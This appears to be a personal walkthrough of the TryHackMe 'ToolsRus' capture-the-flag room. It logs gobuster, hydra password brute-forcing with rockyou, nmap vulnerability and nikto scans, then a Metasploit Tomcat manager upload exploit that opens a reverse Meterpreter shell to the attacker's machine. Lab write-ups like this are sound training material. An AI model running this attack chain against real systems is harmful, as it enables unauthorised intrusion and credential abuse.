# ToolRus

#Date: 18.09.2020

IP: `10.10.221.75`

Tools to Use:
    Dirbuster
    Hydra
    Nmap
    Nikto
    Metasploit

------------

- dirbuster or gobuster 
`gobuster dir -u http://10.10.221.75 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee initial/gobuster.log`

- in guidelines found name `bob`

- using hydra -l bob -P ~/TryHackMe/rockyou.txt -f 10.10.221.75 http-get /protected/ found credentials:
bob:bubbles

- nmap or rust scan
	- open ports
		```
		22
		80
		1234
		8009
		```
- on port 1234 running Apache Tomcat/7.0.88

- nikto -h 10.10.221.75:1234/manager/html -id bob:bubbles

- found few files, 5 docs

---
# metaspolit time :)

```
sudo msfdb init
msfconsole
db_nmap -sC -sV --script vuln 10.10.221.75
```
```
vulners:
[*] Nmap: |   cpe:/a:apache:http_server:2.4.18:
[*] Nmap: |             CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
[*] Nmap: |             CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
[*] Nmap: |             CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
[*] Nmap: |             CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
[*] Nmap: |             CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
[*] Nmap: |             CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
[*] Nmap: |             CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
[*] Nmap: |             CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
[*] Nmap: |             CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
[*] Nmap: |             CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
[*] Nmap: |             CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
[*] Nmap: |             CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
[*] Nmap: |             CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
[*] Nmap: |             CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
[*] Nmap: |             CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
[*] Nmap: |             CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
[*] Nmap: |             CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
[*] Nmap: |             CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
[*] Nmap: |             CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
[*] Nmap: |             CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
[*] Nmap: |             CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
[*] Nmap: |             CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
[*] Nmap: |             CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
[*] Nmap: |             CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
[*] Nmap: |             CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
[*] Nmap: |             CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
[*] Nmap: |             CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
[*] Nmap: |             CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
[*] Nmap: |             CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
[*] Nmap: |             CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
[*] Nmap: |             CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
[*] Nmap: |             CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
[*] Nmap: |             CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
[*] Nmap: |             CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
[*] Nmap: |             CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
[*] Nmap: |             CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
[*] Nmap: |             CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
[*] Nmap: |             CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
[*] Nmap: |             CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
[*] Nmap: |             CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
[*] Nmap: |             CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
[*] Nmap: |             CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
[*] Nmap: |             CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
[*] Nmap: |             CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
[*] Nmap: |             CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
[*] Nmap: |             CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
[*] Nmap: |_            CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
[*] Nmap: 1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: |_http-csrf: Couldn't find any CSRF vulnerabilities.
[*] Nmap: |_http-dombased-xss: Couldn't find any DOM based XSS.
[*] Nmap: | http-enum:
[*] Nmap: |   /examples/: Sample scripts
[*] Nmap: |   /manager/html/upload: Apache Tomcat (401 Unauthorized)
[*] Nmap: |   /manager/html: Apache Tomcat (401 Unauthorized)
[*] Nmap: |_  /docs/: Potentially interesting folder
[*] Nmap: |_http-server-header: Apache-Coyote/1.1
[*] Nmap: |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
[*] Nmap: 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 331.67 seconds
```
```
search tomcat
use 17
msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPssword bubbles
HttpPssword => bubbles
msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOST 10.10.221.75
RHOST => 10.10.221.75
msf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234



msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.8.106.217:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying gQQmN8XGawTguz9UNd8P...
[*] Executing gQQmN8XGawTguz9UNd8P...
[*] Undeploying gQQmN8XGawTguz9UNd8P ...
[*] Sending stage (53905 bytes) to 10.10.221.75
[*] Meterpreter session 1 opened (10.8.106.217:4444 -> 10.10.221.75:59972) at 2020-09-18 17:05:40 +0200

meterpreter > shell

```



